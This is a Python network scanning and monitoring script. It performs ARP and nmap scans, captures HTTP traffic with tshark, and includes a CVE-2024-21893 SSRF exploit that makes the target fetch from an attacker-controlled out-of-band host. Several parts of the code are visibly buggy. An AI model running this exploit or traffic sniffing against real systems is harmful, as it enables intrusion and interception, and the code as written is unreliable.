#!/usr/bin/python3

"""
Script for network scanning and monitoring.

Example Usages:
    python3 hackdiablo.py arpscan
    python3 hackdiablo.py hostdiscovery -v
    sudo python3 hackdiablo.py scan -v
"""

import csv
import datetime
import ipaddress
import logging
import nmap
import os
import json
import re
import requests
import sys
import subprocess
import scapy.all as scapy
import socket
import time
from math import floor
from pathlib import Path
from typing import Union
from urllib.parse import urlparse
from utils.decorators import timing_decorator
from utils.custom_logging import create_logger

_APP_NAME = "hackdiablo"
DEBUG_MODE = False

ACTION_DICT = {
  'arpscan': 'Perform ARP scan on specified IP range.',
  'hostdiscovery': 'Quickly find hosts on network.',
  'scan': 'Perform network scan using nmap on specified IP range.',
  'monitor': 'Monitor network traffic for a specified duration.',
  'pi': 'Enable Raspberry Pi specific features.',
  'getip': 'Get current IP address using ipquery.io API.',
}

CUR_DIR_PATH = Path(os.path.realpath(__file__)).parent
DEFAULT_LOG_LEVEL = logging.DEBUG if DEBUG_MODE else logging.INFO

DEFAULT_INTERFACE = 'en0'
DEFAULT_OCTLET = '24'
DEFAULT_IP_RANGE = f'192.168.0.0/{DEFAULT_OCTLET}'

DEFAULT_MONITOR_TIME_SEC = 60
DEFAULT_INTERVAL_SEC = 2

VALID_HOST_KEYS = ['ip_address', 'hostname', 'mac_address', 'public_ip_address', 'raw_data']

RE_IP_ADDRESS = r'^(?P<address>(\d.)+\d+)(\/(?P<subnet_mask_cidr>\d+))?$'
RE_YYYYMMDDHHMMSS = r'^\d{14}$'


class HackDiablo(object):
    def __init__(self, **kwargs):
        working_dir_path = Path(kwargs.get('working_dir', str(CUR_DIR_PATH.resolve())))
        self._save_data_dir = working_dir_path / 'data' / _APP_NAME
        self._save_data_dir.mkdir(parents=True, exist_ok=True)
        self.verbose = kwargs.get('verbose', False)

        log_level = logging.DEBUG if (self.verbose or DEBUG_MODE) else DEFAULT_LOG_LEVEL
        self._logger = kwargs.get('logger') or create_logger(_APP_NAME, level=log_level, log_dir=working_dir_path/'logs')

        self.scan_data: dict = dict()
        self.host_data: dict = dict()

        # HOST DATA
        # ----------------------------------------------------------------------------------
        self.hostname, self.ip_address = self.get_local_host()
        self.public_ip_address = self.get_public_ip()
        self.current_host = self.new_host_template(**{
            "ip_address": self.ip_address,
            "hostname": self.hostname,
            "mac_address": None,
            "public_ip_address": self.public_ip_address,
            "raw_data": []
        })
        self.add_host(self.current_host)

        self.ip_range = f"{self.ip_address}/{kwargs.get('octlet', DEFAULT_OCTLET)}" if self.ip_address else None
        self._logger.debug(f"[__init__] LOG_LEVEL:{logging.getLevelName(self._logger.level)};SAVE_DIR:\'{self._save_data_dir.resolve().__str__()}\';LOCAL_IP:{self.current_host['ip_address']};HOSTNAME:{self.current_host['hostname']};MAC_ADDRESS:{self.current_host['mac_address']};PUBLIC_IP:{self.current_host['public_ip_address']};IP_RANGE:{self.ip_range};")

    def __str__(self) -> str:
        return f"LOCAL_IP:{self.current_host['ip_address']};HOSTNAME:{self.current_host['hostname']};MAC_ADDRESS:{self.current_host['mac_address']};PUBLIC_IP:{self.current_host['public_ip_address']};IP_RANGE:{self.ip_range};"

    def add_host(self, host:dict)->bool:
        did_add = False
        if host.get('ip_address') is None:
            self._logger.warning(f"[add_host] Attempted to add host without IP address: {host}")
            return False

        # detect changes in already existing host entry and update accordingly, otherwise add new entry to host_data
        if host['ip_address'] in self.host_data:
            ip_address = host['ip_address']
            for k in VALID_HOST_KEYS:
                if k == 'ip_address': continue
                current_host_value = self.host_data[ip_address][k]
                new_host_value = host[k]

                # case: list type
                if isinstance(current_host_value, list) and isinstance(new_host_value, list):
                    # update existing value if current value is empty and new value has data
                    if not len(current_host_value) and len(new_host_value):
                        self.host_data[ip_address][k] = new_host_value
                        did_add = True

                    # update existing value if there are new items in the list that are not already in the current value
                    # this allows us to keep existing data while also adding any new data we may have found about the host
                    elif current_host_value and new_host_value:
                        combined_value = current_host_value + [ item for item in new_host_value if item not in current_host_value ]
                        if len(combined_value) > len(current_host_value):
                            self.host_data[ip_address][k] = combined_value
                            did_add = True

                # case: non-list type
                elif current_host_value and not new_host_value:
                    # keep existing value, do not overwrite with empty value
                    did_add = did_add or False

                # update existing value if current value is empty and new value has data
                elif new_host_value and not current_host_value:
                    self.host_data[ip_address][k] = new_host_value
                    did_add = True

                # conflicting values, keep existing value and log warning
                elif new_host_value and current_host_value and new_host_value != current_host_value:
                    self._logger.warning(f"[add_host] conflicting values for Host ({ip_address}) for '{k}': existing value '{current_host_value}' vs new value '{new_host_value}'. Keeping existing value.")
                    did_add = did_add or False
            return did_add

        # add new entry
        self.host_data[host['ip_address']] = dict()
        for k in VALID_HOST_KEYS:
            self.host_data[host['ip_address']][k] = host.get(k)
        return True if self.host_data.get(host['ip_address']) else False


    def arp_scan(self, ip_range:str, sorted:bool=True)->list:
        """
        Performs an ARP scan on the specified IP range. Adds responsive hosts to host_data and returns a list of found hosts with their IP and MAC addresses.

        Args:
            ip_range (str): The target IP address or network range (e.g., "192.168.1.1/24").
            sorted (bool): Whether to sort the results by IP address. Defaults to True.

        Returns:
            list: A list of dictionaries, each containing 'ip' and 'mac' of a responsive device.
            Example: [{'ip': '192.168.0.2', 'mac': 'd0:d2:b0:98:3e:79'}, ... ]
        """
        # Create an ARP request packet
        self._logger.debug(f"[arp_scan] performing arp scan for ip_range `{ip_range}`")
        arp_request = scapy.ARP(pdst=ip_range)

        # Create an Ethernet frame to broadcast the ARP request
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

        # Combine the Ethernet frame and ARP to create packet
        request_broadcast_packet = broadcast / arp_request

        # Send the packet and receive the response
        # srp() sends and receives packets at layer 2
        answered_list, unanswered_list = scapy.srp(request_broadcast_packet, timeout=2, verbose=False)

        scan_results: list = list()
        for answered_packet in answered_list:

            ip_address = answered_packet[1].psrc
            mac_address = answered_packet[1].hwsrc
            self._logger.debug(f"[arp_scan] creating new host: ip_address:{ip_address}\tmac_address:{mac_address}")
            new_host = self.new_host_template(**{
                "ip_address": ip_address,
                "hostname": None,
                "public_ip_address": None,
                "mac_address": str(mac_address).upper() if mac_address else None,
                "raw_data": [{'arp': answered_packet[1].summary()}]
            })
            self.add_host(new_host)
            scan_results.append(new_host)

        if sorted:
            scan_results.sort(key=lambda x: ipaddress.IPv4Address(x['ip_address']))
        self.scan_data['arp'] = scan_results
        self._logger.info(f"[arp_scan] scan completed -- {len(scan_results)} hosts found in range {ip_range}.")
        return scan_results


    def export_data(self, output_dir_path:Path=None, filename:str=None, data:Union[dict,str]=None, **kwargs)->bool:
        """
        Exports collected data to the specified output directory path. This can include saving host information, scan results, and any other relevant data in structured formats such as JSON or CSV.

        Args:
            - output_dir_path (Path): The directory path where the data should be saved. If None, defaults to the current working directory.
            - filename (str): The name of the output file. If None, a default name with a timestamp will be generated.
            - data (dict or str): The data to be exported. If None, defaults to exporting host_data and scan_data in a structured format.
        Returns:
            - bool: True if the data was successfully exported, False otherwise.
        """
        is_exported = False
        do_verbose:bool = kwargs.get('verbose', False)

        def ensure_output_dir(path:Path):
            if not path.exists():
                path.mkdir(parents=True, exist_ok=True)
            elif not path.is_dir():
                raise NotADirectoryError(f"Output path '{path.absolute().__str__()}' is not a directory. Please specify a valid directory path.")
            elif not os.access(path, os.W_OK):
                raise PermissionError(f"Output path '{path.absolute().__str__()}' is not writable. Please check permissions or run with elevated privileges.")
            return path

        default_output = dict({'hosts': dict(sorted(self.host_data.items(), key=lambda x: ipaddress.IPv4Address(x[0]))), 'host_count': len(self.host_data), 'scan_data': self.scan_data})
        output_dir_path = self._save_data_dir if output_dir_path is None else ensure_output_dir(output_dir_path)
        out_data = data if data is not None else default_output

        # normalize filename to include timestamp if not already included, ensures uniqueness of output files and provides context of when the scan was performed
        datetime_str :str = datetime.datetime.now(datetime.UTC).strftime('%Y%m%d%H%M%S')
        if filename is None:
            filename = f"{datetime_str}--{_APP_NAME}"
        elif filename is not None and re.search(RE_YYYYMMDDHHMMSS, filename.split('--')[0]) is None:
            filename = f"{datetime_str}--{filename}"

        # determine output format based on data type and write to file
        try:
            output_file_path = None
            if isinstance(out_data, class_or_tuple := (dict, list)):
                if filename.lower().endswith(".json") is False:
                    filename += ".json"
                output_file_path = output_dir_path / filename
                # self._logger.debug(f"[export_data] trying to export data to \'{output_file_path.absolute()}\'")
                output_file_path.write_text(json.dumps(out_data, indent=2))
            elif isinstance(out_data, str):
                if filename.lower().endswith(".txt") is False:
                    filename += ".txt"
                output_file_path = output_dir_path / filename
                # self._logger.debug(f"[export_data] trying to export data to \'{output_file_path.absolute()}\'")
                output_file_path.write_text(out_data)
            else:
                raise ValueError(f"Unsupported data type for export: {type(out_data)}. Supported types are: {class_or_tuple}")

            # verify that file was created and has content
            if output_file_path.exists() and output_file_path.stat().st_size > 0:
                self._logger.info(f"[export_data] data exported to: \'{output_file_path.absolute()}\'")
                is_exported = True

        except Exception as e:
            self._logger.error(f"[export_data] an error occurred while exporting data: {e}")
            is_exported = False

        # print summary of results to console if verbose mode is enabled and there is host data to display
        if do_verbose and len(self.host_data):
            divider_length = 75
            # print(f"\n\nHosts Found: {len(self.host_data)} in range {target_ip_range}")
            print(f"\n\nHosts Found: {len(self.host_data)} in range {self.ip_range}")
            print("-" * divider_length)
            print("IP Address\t\tMAC Address\t\tNum Open Ports")
            print("-" * divider_length)

            for host, data in self.host_data.items():
                num_open_ports = 0
                raw_data = data.get('raw_data', [])
                for raw_scan_data in raw_data:
                    for k,v in raw_scan_data.items():
                        if k != 'other_data': continue
                        open_ports = v.get('open_ports') if v.get('open_ports') else {'tcp': {}, 'udp': {}}
                        for k,v in open_ports.items():
                            num_open_ports += len(v)
                print(f"{data.get('ip_address') or 'N/A'}\t\t{data.get('mac_address') or '\t\t'}\t\t{num_open_ports}\t\t")

            print("-" * divider_length)
            print ("\n")

        return is_exported

    def get_local_host(self):
        """ Retrieves and returns the hostname and local IP address. """
        hostname = None
        ip_address = None
        try:
            hostname = socket.gethostname()
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
        except Exception as e:
            self._logger.error(f"[get_local_host] Error getting local IP address and hostname: {e.__str__()}")
        return hostname, ip_address

    def get_public_ip(self, ip_address:Union[str, list]=None)->Union[str, dict, list]:
        """"
        Utilizing ipquery.io API to get current IP address.
        Returns your current IP address. If no specific format is requested, this endpoint defaults to returning plain text.
        Allows bulk query multiple IP addresses in a single request. Comma separated. Results are returned as a list.

        NOTES:
            is_mobile	Boolean	True if associated with cellular network.
            is_vpn	Boolean	True if belongs to a known VPN provider.
            is_tor	Boolean	True if is a known Tor exit node.
            is_proxy	Boolean	True if is a known public proxy.
            risk_score	Integer	0-100 score indicating malicious activity likelihood.

            - Is this really free? Yes. We offer a public, free-tier API that covers most developer use-cases. We believe in open access to basic infrastructure data.
        """
        url = 'https://api.ipquery.io/'
        if ip_address:
            if isinstance(ip_address, list):
                ip_address = ','.join(ip_address)
            url += f"{ip_address}/"

        try:
            self._logger.debug(f"[get_public_ip] sending GET request to ipquery.io API for {ip_address or 'current ip address'}")
            resp = requests.get(url, timeout=15)
            resp.raise_for_status()
            try:
                data = resp.json()
            except requests.exceptions.JSONDecodeError:
                data = resp.text

            if ip_address:
                location = ""
                if isinstance(data, list) and len(data) > 0:
                    location_set = set()
                    for x in data:
                        location_set.add((x.get('location', {}).get('city', 'Unknown'), x.get('location', {}).get('state', 'Unknown')))
                    location = '; '.join([f"{loc[0]}, {loc[1]}" for loc in location_set])
                elif isinstance(data, dict):
                    city = data.get('location', {}).get('city', 'na')
                    state = data['location'].get('state', 'na')
                    location = f"{city}, {state}"
                else: pass
                self._logger.debug(f"[get_public_ip] ipquery location found: {location}")
            else:
                self._logger.debug(f"[get_public_ip] ipquery ip address found: {data}")
                pass
        except KeyError as e:
            self._logger.error(f"[get_public_ip] KeyError accessing response data from ipquery: {e.__str__()}")
            pass
        return data

    def new_host_template(self, **kwargs)->dict:
        new_host = dict()
        for k in VALID_HOST_KEYS:
            new_host[k] = kwargs.get(k)
        return new_host


    def monitor(self, t_duration_secs:int=DEFAULT_MONITOR_TIME_SEC)->Path:
        datetime_str = datetime.datetime.now(datetime.UTC).strftime('%Y%m%d%H%M%S')
        fname = __file__.split('/')[-1].split('.')[0]
        pcap_data_filepath = self._save_data_dir / f"{datetime_str}--{fname}--monitor--{t_duration_secs}s.pcap"
        pcap_data_filepath.touch()

        # Ensure the output directory is writable
        if not os.access(pcap_data_filepath, os.W_OK):
            raise PermissionError(f"Output path '{pcap_data_filepath.absolute().__str__()}' is not writable. Please check permissions or run with elevated privileges.")

        # Run tshark command to capture network traffic and save to pcap file
        self._logger.info(f"[monitor] starting network monitor for {t_duration_secs} seconds, saving pcap data to: {pcap_data_filepath.absolute()}")
        tshark_command_list = ["sudo", "tshark", "-i", "any", "-a", f"duration:{t_duration_secs}"]
        if pcap_data_filepath.exists():
            # tshark_command_list += ["-w", pcap_data_filepath.absolute().__str__()]
            tshark_command_list += ["-w", pcap_data_filepath.resolve().__str__()]

        # check OS, enable promiscuous mode on Linux
        if not os.uname().sysname.lower() == 'linux':
            self._logger.warning(f"[monitor] detected os '{os.uname().sysname.lower()}' -- disabling promiscuous mode")
            # prevents the tool from putting the network interface into promiscuous mode
            tshark_command_list += ["-p"]

        try:
            t_0 = time.time()
            self._logger.debug(f'[monitor] running tshark command: {" ".join(tshark_command_list)}')
            cmd_results = subprocess.run(tshark_command_list, capture_output=True, text=True, check=True)
            t_1 = time.time()
            t_end = t_1 - t_0
            self._logger.debug(f"[monitor] network monitoring completed in {t_end:.2f} seconds.")

            # ADD TO SCAN DATA(?)
            std_out = cmd_results.stdout
            if 'monitor' in self.scan_data:
                self.scan_data['monitor'].update({
                    f"{datetime_str}": {
                        "t_duration_secs": t_duration_secs,
                        "t_end": t_end,
                        "tshark_command_list": tshark_command_list,
                        "stdout": std_out
                    }
                })

            # Read the captured packets from the PCAP file if it exists
            packets = scapy.rdpcap(pcap_data_filepath.resolve().__str__())
            self._logger.info(f"[monitor] total packets captured: {len(packets)}")
            http_data_list: list = list()
            for packet in packets:
                if scapy.TCP not in packet or scapy.packet.Raw not in packet: continue
                payload = bytes(packet[scapy.packet.Raw].load)

                # Check for HTTP methods
                if not any(method in payload for method in [b'GET', b'POST', b'PUT', b'DELETE']):
                    continue

                timestamp = datetime.datetime.fromtimestamp(float(packet.time)).isoformat()
                http_data_list.append({'timestamp': timestamp, 'payload': payload.decode("utf-8").replace("\r\n", " ").strip()})

            if len(http_data_list):
                self._logger.info(f"[monitor] num of HTTP packets captured: {len(http_data_list)}")

                # write to JSON file
                json_output_filepath = pcap_data_filepath.with_suffix('.json')
                logger.debug(f"[monitor] writing HTTP data to JSON file: {json_output_filepath.resolve().__str__()}")
                json_output_filepath.write_text(json.dumps(http_data_list, indent=2))

                # write to CSV file
                csv_output_filepath = pcap_data_filepath.with_suffix('.csv')
                self._logger.debug(f"[monitor] writing HTTP data to CSV file: {csv_output_filepath.resolve().__str__()}")
                # Use 'w' mode and newline='' for CSV writing
                with open(csv_output_filepath, 'w', newline='') as f:
                    w = csv.DictWriter(f, http_data_list[0].keys())
                    w.writeheader()
                    w.writerows(http_data_list)

                # print data to console
                if self.verbose:
                    print(f"\n[monitor] Packet Data:\n{json.dumps(http_data_list, indent=2)}\n")
            else:
                self._logger.info(f"[monitor] no HTTP packets captured during monitoring period.")
            return pcap_data_filepath
        except subprocess.CalledProcessError as e:
            self._logger.error(f"[monitor] an error occurred while monitoring network: {e.stderr}")
        except PermissionError as e:
            self._logger.error(f"[monitor] permission error while monitoring network: {e}")
        except Exception as e:
            self._logger.error(f"[monitor] an unexpected error occurred while monitoring network: {e}")


    def nmap_scan(self, target:str, ports:Union[str,list[int]]='1-1000', arguments:str="-sV -O", do_sudo:bool=False, **kwargs):
        """
        Performs an nmap scan on the specified target IP address or range.

        Args:
            target (str): The target IP address or range to scan.
            ports (str|list[int]): The ports to scan (e.g., "1-1000" or "80,443").
            arguments (str): Additional nmap arguments (e.g., "-sV -O").

        Returns:
            list: A list of dictionaries containing scan results for each host.
        """
        nm = nmap.PortScanner()
        force_include_closed_ports = True
        try:
            self._logger.debug(f"[nmap_scan] performing nmap scan with args: {arguments} ")
            # nm.scan(hosts=target, ports=ports, arguments=arguments, sudo=do_sudo)
            nm.scan(hosts=target, arguments=arguments, sudo=do_sudo)
            scan_results: list = list()
            for host in nm.all_hosts():
                host_raw_data_list: list = list()
                other_data = {}
                host_ip_address = host
                host_hostname = nm[host].hostname()
                host_mac_address = None
                host_addresses = nm[host].get('addresses', {})
                host_raw_data_list.append({"nmap": nm[host]})

                if host_addresses:
                    host_ipv4_address = host_addresses.get('ipv4')
                    host_ipv6_address = host_addresses.get('ipv6')
                    host_mac_address = str(host_addresses.get('mac')).upper() if host_addresses.get('mac') else None
                    other_data.update({ "ipv4": host_ipv4_address, "ipv6": host_ipv6_address, "mac_address": host_mac_address})

                if nm[host].get('tcp') or nm[host].get('udp'):
                    open_ports = {"tcp": {}, "udp": {}}
                    has_open_ports = False
                    for port, data in nm[host].get('tcp', {}).items():
                        if data['state'] == 'open':
                            has_open_ports = True
                            open_ports['tcp'][port] = data
                    for port,data in nm[host].get('udp', {}).items():
                        if data['state'] == 'open':
                            has_open_ports = True
                            open_ports['udp'][port] = data
                    if has_open_ports or force_include_closed_ports:
                        other_data.update({"open_ports": open_ports})

                host_raw_data_list.append({"other_data": other_data})
                host_data = self.new_host_template(**{
                    "ip_address": host_ip_address,
                    "hostname": host_hostname,
                    "public_ip_address": None,
                    "mac_address": host_mac_address,
                    "raw_data": host_raw_data_list
                })
                host_data.update({
                    'state': nm[host].state(),
                    'protocols': {},
                    'osmatches': nm[host].get('osmatch', [])
                })

                # iterate through protocols (tcp, udp) and ports to extract relevant information about each open port
                for proto in nm[host].all_protocols():
                    host_data['protocols'][proto] = []
                    for port in nm[host][proto].keys():
                        port_info = {
                            'port': port,
                            'state': nm[host][proto][port]['state'],
                            'reason': nm[host][proto][port]['reason'],
                            'name': nm[host][proto][port]['name'],
                            'product': nm[host][proto][port].get('product', ''),
                            'version': nm[host][proto][port].get('version', ''),
                            'extrainfo': nm[host][proto][port].get('extrainfo', ''),
                            'conf': nm[host][proto][port].get('conf'),
                            'cpe': nm[host][proto][port].get('cpe'),
                        }
                        host_data['protocols'][proto].append(port_info)
                self._logger.debug(f"[nmap_scan] creating new host: '{host_data['hostname'] or host_data['ip_address']}'")
                self.add_host(host_data)
                scan_results.append(host_data)
            self.scan_data['nmap'] = scan_results
            self._logger.info(f"[nmap_scan] scan completed -- {len(scan_results)} hosts found in range {target_ip_range}.")
            return scan_results
        except Exception as e:
            self._logger.error(f"[nmap_scan] Error performing nmap scan: {e.__str__()}")
            raise e

    def os_detection_scan_OLD(self, target_range:str):
        """
        Performs an OS detection scan using nmap on the specified target range.

        Args:
            target_range (str): The target IP address or range to scan.

        Returns:
            list: A list of dictionaries containing OS detection results for each host.
        """
        target_range = target_range or self.ip_range
        scan_results: dict = dict()
        self._logger.info(f"[os_detection_scan] performing OS detection scan on target range: {target_range}, running host discovery")
        nm = nmap.PortScanner()

        # Step 1: Fast Host Discovery (Ping Sweep without port scanning)
        # -sn: Disable port scanning
        # -n: Skip DNS resolution for speed
        # -T4: Aggressive timing template
        nm.scan(hosts=target_range, arguments='-sn -n -T4')
        live_hosts = sorted([host for host in nm.all_hosts() if nm[host].state() == 'up'], key=lambda x: ipaddress.IPv4Address(x))
        self._logger.debug(f"[os_detection_scan] live hosts: {live_hosts}")
        self._logger.info(f"[os_detection_scan] num of live hosts found: {len(live_hosts)}")

        # Step 2: Fastest OS Detection on Live Hosts
        # -O: Enable OS detection
        # --osscan-limit: Skip OS detection if target lacks 1 open & 1 closed port (huge time saver)
        # --max-os-tries 1: Do not re-attempt failed fingerprint tries
        # -sV: Probe open ports to determine service/version info (helps OS detection)
        for host in live_hosts:
            self._logger.debug(f"[os_detection_scan] performing OS detection scan on host: {host}")
            # nm.scan(hosts=host, arguments='-O --osscan-limit --max-os-tries 1 -n -T4')
            nm.scan(hosts=host, arguments='-O --osscan-limit --max-os-tries 1 -n -T4 -sV')
            if 'osmatch' in nm[host] and len(nm[host]['osmatch']) > 0:
                os_matches = nm[host].get('osmatch', [])

                new_host = self.new_host_template(**{
                    "ip_address": host,
                    "hostname": nm[host].hostname(),
                    "public_ip_address": None,
                    "mac_address": nm[host].get('addresses', {}).get('mac'),
                    "raw_data": [{'nmap': nm[host]}]
                })
                new_host.update({"state": nm[host].state(), "osmatches": os_matches})
                scan_results[host] = new_host
                self.add_host(new_host)
        return scan_results

    # FIXED
    # -------
    def os_detection_scan(self, target_range: str):
            """
            Performs an OS detection scan using nmap on the specified target range.

            Args:
                target_range (str): The target IP address or range to scan.

            Returns:
                dict: A dictionary containing OS detection results for each host.
            """
            target_range = target_range or self.ip_range
            scan_results: dict = dict()
            self._logger.info(f"[os_detection_scan] performing OS detection scan on target range: {target_range}, running host discovery")

            # This scanner is dedicated solely to the initial global host discovery
            discovery_nm = nmap.PortScanner()

            # Step 1: Fast Host Discovery (Ping Sweep without port scanning)
            discovery_nm.scan(hosts=target_range, arguments='-sn -n -T4')
            live_hosts = sorted(
                [host for host in discovery_nm.all_hosts() if discovery_nm[host].state() == 'up'],
                key=lambda x: ipaddress.IPv4Address(x)
            )
            self._logger.debug(f"[os_detection_scan] live hosts: {live_hosts}")
            self._logger.info(f"[os_detection_scan] num of live hosts found: {len(live_hosts)}")

            # Step 2: Fastest OS Detection on Live Hosts
            for host in live_hosts:
                host_str = str(host) # Force the variable to a string representation
                self._logger.debug(f"[os_detection_scan] performing OS detection scan on host: {host_str}")

                host_nm = nmap.PortScanner()
                host_nm.scan(hosts=host_str, arguments='-O --osscan-limit --max-os-tries 1 -n -T4 -sV')

                # 🛠 FIX: Check against .all_hosts() to bypass python-nmap's type assertions
                if host_str in host_nm.all_hosts() and 'osmatch' in host_nm[host_str] and len(host_nm[host_str]['osmatch']) > 0:
                    os_matches = host_nm[host_str].get('osmatch', [])

                    new_host = self.new_host_template(**{
                        "ip_address": host_str,
                        "hostname": host_nm[host_str].hostname(),
                        "public_ip_address": None,
                        "mac_address": host_nm[host_str].get('addresses', {}).get('mac'),
                        "raw_data": [{'nmap': host_nm[host_str]}]
                    })
                    new_host.update({"state": host_nm[host_str].state(), "osmatches": os_matches})
                    scan_results[host_str] = new_host
                    self.add_host(new_host)
                else:
                    self._logger.warning(f"[os_detection_scan] Host {host_str} returned no OS fingerprint details")

            return scan_results

class CVEChecker:
    def __init__(self, **kwargs):
        self.verbose = kwargs.get('verbose', False)
        log_level = logging.DEBUG if self.verbose else DEFAULT_LOG_LEVEL
        self._logger = logging.getLogger(_APP_NAME) or create_logger(_APP_NAME, level=log_level)

    def cve_2024_2189(self, target_url, attacker_server):
        """

        ----------------------------------------------------------------------------
        Example:
            cve_checker = CVEChecker()
            cve_checker.cve_2024_2189(target_url="http://target.com/dana-ws/saml20.ws", attacker_server="http://attacker.oastify.com")

        ----------------------------------------------------------------------------
        source: https://github.com/h4x0r-dz/CVE-2024-21893.py
        run python CVE-2024-21893.py -u target.com -a http://xxxxxxxxx.oastify.com
        """

        def ensure_http(url:str):
            if not url.startswith("http://") and not url.startswith("https://"):
                return f"https::/{url}"
            return url

        xml_soap_payload  = """<?xml version="1.0" encoding="UTF-8"?>
            <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                <soap:Body>
                    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                        <ds:SignedInfo>
                            <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                            <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
                        </ds:SignedInfo>
                        <ds:SignatureValue>qwerty</ds:SignatureValue>
                        <ds:KeyInfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.w3.org/2000/09/xmldsig#" xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
                            <ds:RetrievalMethod URI="{attacker_server}"/>
                            <ds:X509Data/>
                        </ds:KeyInfo>
                        <ds:Object></ds:Object>
                    </ds:Signature>
                </soap:Body>
            </soap:Envelope>"""
        target_url = ensure_http(target_url)
        payload = xml_soap_payload.format(attacker_server=attacker_server)

        parsed_url = urlparse(target_url)
        full_path = parsed_url.path if parsed_url.path else "/dana-ws/saml20.ws"
        host = parsed_url.netloc

        headers = {
            "Content-Type": "text/xml",
            "User-Agent": "curl/8.4.0",
            "Accept": "*/*",
            "Connection": "close",
            "Content-Length": str(len(payload))
        }

        self._logger.info(f"Sending PoC to {target_url}...")
        self._logger.info(f"Sending request to {url}...")

        url = f"{parsed_url.scheme}://{host}{full_path}"
        response = requests.post(f"{parsed_url.scheme}://{host}{full_path}", data=payload, headers=headers, verify=False)
        return response


@timing_decorator
def cli_arp_scan(interface=DEFAULT_INTERFACE, subnet=DEFAULT_IP_RANGE):
    import subprocess
    """
    Runs the system's arp-scan command-line tool via subprocess and prints the output.
    Requires the 'arp-scan' utility to be installed on the system and root privileges.
    """
    command = ["sudo", "arp-scan"]
    if interface:
        command.extend(["-I", interface])
    if subnet:
        command.append(subnet)
    else:
        command.append("--localnet") # Scan local network

    # will output same as `arp_scan` function, just as string instead of list of dicts
    # command.append('-xq')  # -x: Do not resolve hostnames, -q: Quiet output

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        # prints(result.stdout)
    except subprocess.CalledProcessError as e:
        # _LOGGER.error(f"[cli_arp_scan] running arp-scan: {e.stderr}")
        print(f"[cli_arp_scan] running arp-scan: {e.stderr}")
    except FileNotFoundError:
        # _LOGGER.error("[cli_arp_scan] arp-scan command not found. Please install the arp-scan utility.")
        print("[cli_arp_scan] arp-scan command not found. Please install the arp-scan utility.")
    return result.stdout

class RPC():
    def __init__(self, **kwargs):
        self.verbose = kwargs.get('verbose', False)
        log_level = logging.DEBUG if self.verbose else DEFAULT_LOG_LEVEL
        self._logger = kwargs.get('logger') or create_logger(_APP_NAME, level=log_level)
        self.is_raspberry_pi = self.check_raspberry_pi()

    def __str__(self) -> str:
        return "Raspberry Pi Controller"

    def check_raspberry_pi(self)->bool:
        """
        Check if the current system is a Raspberry Pi.
        """
        try:
            with open('/etc/os-release', 'r') as f:
                os_release = f.read().lower()
                if 'raspberry pi' in os_release:
                    self._logger.debug("[check_raspberry_pi] Raspberry Pi detected.")
                    return True

            with open('/proc/cpuinfo', 'r') as f:
                cpuinfo = f.read().lower()
                if 'raspberry pi' in cpuinfo or 'bcm' in cpuinfo:
                    self._logger.debug("[check_raspberry_pi] Raspberry Pi detected.")
                    return True
        except FileNotFoundError as e:
            filename = e.filename if hasattr(e, 'filename') else 'unknown file'
            self._logger.error(f"[check_raspberry_pi] file not found: \'{filename}\'. Cannot determine if system is Raspberry Pi.")
            return False
        self._logger.debug("[check_raspberry_pi] Not a Raspberry Pi.")
        return False

    def capture(self, time_seconds:int=None, interval_seconds:int=DEFAULT_INTERVAL_SEC):
        """
        Capture images using the Raspberry Pi camera module.
        Args:
        - time_seconds (int): Total duration to capture images in seconds. If None, captures a single image.
        - interval_seconds (int): Interval between captures in seconds when time_seconds is specified. Defaults to 2s.
        """
        # take and save photo with raspistill

        cmd = "raspistill -v -o photo.jpg"

        if time_seconds is not None:
            # EXAMPLE: capture every 2s over a total of 30s, named image1.jpg, image0002.jpg...image0015.jpg
            #cmd = "raspistill -t 30000 -tl 2000 -o image%04d.jpg"
            cmd = f"raspistill -t {time_seconds * 1000} -tl {interval_seconds * 1000} -o image%04d.jpg"

        # set the longitude with EXIF tag to add GPS metadata, the following would set 5degs, 10 minutes, 15 seconds:
        #cmd = "raspistill --exif GPS.GPSLongitude=5/1,10/1,15/100"
        return self.run(cmd)


    def run(self, cmd):
        results = None
        try:
            self._logger.debug(f"[rpc_run] executing command: {cmd}")
            results = subprocess.run(cmd, capture_output=True, text=True, check=True)
            self._logger.debug(f"[rpc_run] command output: {results.stdout}")
        except subprocess.CalledProcessError as e:
            self._logger.error(f"[rpc_run] an error occurred while executing command: {e.stderr}")
        except Exception as e:
            self._logger.error(f"[rpc_run] an unexpected error occurred: {e}")
        return results


if __name__ == "__main__":
    import argparse

    # Argument parsing
    parser = argparse.ArgumentParser(description="Network Scanner using ARP requests.")
    parser.add_argument('action', nargs='*',default=[], help='Action to perform.')
    parser.add_argument('-v', '--verbose', action='store_true', help='Toggle to enable verbose output.', default=False)
    parser.add_argument("-o", "--outdir", nargs='?', default=None, type=str, help=f"Output directory path.")
    parser.add_argument('-e', '--export', action='store_true', help='Toggle to export data to output directory.', default=False)
    parser.add_argument('-i', '--interface', default=None, help='Network interface to use for scanning.')
    parser.add_argument('-t', '--time', type=int, default=None, help='Duration for network monitoring in seconds')

    args = parser.parse_args()

    # Argument handling
    interface = args.interface or DEFAULT_INTERFACE
    time_duration = args.time or DEFAULT_MONITOR_TIME_SEC
    is_verbose = args.verbose or False
    do_export = args.export or False
    output_dir_path: Path = Path(args.outdir) if args.outdir else None
    working_dir: str = str(output_dir_path.resolve()) if output_dir_path else str(CUR_DIR_PATH.resolve())


    # Logger setup
    log_dir = Path(working_dir) / "logs"
    log_level = logging.DEBUG if (is_verbose or DEBUG_MODE) else DEFAULT_LOG_LEVEL
    logger = create_logger(_APP_NAME, level=log_level, log_dir=log_dir)
    logger.debug(f'[main] ARGS:{args};LOG_LEVEL:{logger.level};LOG_HANDLERS:{logger.handlers};')

    # Action handling
    action = str(args.action[0]).lower() if len(args.action) >= 1 else None
    action_args_list = args.action[1:] if len(args.action) > 1 else []
